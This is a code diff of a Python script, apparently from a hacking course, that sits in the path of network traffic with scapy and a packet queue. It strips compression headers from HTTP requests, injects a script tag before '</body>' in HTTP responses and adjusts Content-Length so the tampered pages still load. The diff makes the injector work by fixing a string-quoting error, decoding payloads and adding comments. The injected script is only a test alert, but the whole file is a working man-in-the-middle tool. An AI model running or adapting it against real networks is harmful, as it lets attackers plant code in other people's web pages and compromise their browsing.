@@ -37,22 +37,34 @@ def flush_iptables():
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] HTML Request:")
-            load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print('[+] Response:')
-            injection_code = <script>alert("test");</script>
-            load = load.replace('</body>', f'{injection_code}</body>')
-            content_length_search = re.search(r'Content-Length:\s(\d*)', load)
-            if content_length_search:
-                content_length = content_length_search.group(1)
-                new_content_length = str(int(content_length) + len(injection_code))
-                load = load.replace(content_length, new_content_length)
-        if load != scapy_packet[scapy.Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(bytes(new_packet))
+        try:
+            # Load the "load" HTML variable for later use and decode it for use as a string instead of bytes
+            load = scapy_packet[scapy.Raw].load.decode()
+            # Looks for requests on HTML port by looking at destination port variable
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+] HTML Request:")
+                # Modifies the request to not allow encoding for easier changes to be made
+                load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)           
+            # Looks for reseponses on HTML port by looking at source port variable
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print('[+] Response:')
+                injection_code = '<script>alert("test");</script>'
+                # Looks for the end of HTML code and inserts our script
+                load = load.replace('</body>', f'{injection_code}</body>')
+                # Looks if there is a content length variable that needs to be changed
+                content_length_search = re.search(r'Content-Length:\s(\d*)', load)
+                # Changes the length of the content length variable depending on what we are injecting
+                if content_length_search and "text/html" in load:
+                    content_length = content_length_search.group(1)
+                    new_content_length = str(int(content_length) + len(injection_code))
+                    load = load.replace(content_length, new_content_length)
+            # Checks if there have been changes made to the packet load
+                # If there has, loads those changes into the packet for forwarding
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load.encode())
+                packet.set_payload(bytes(new_packet))
+        except UnicodeDecodeError:
+            pass
 
 
     packet.accept()
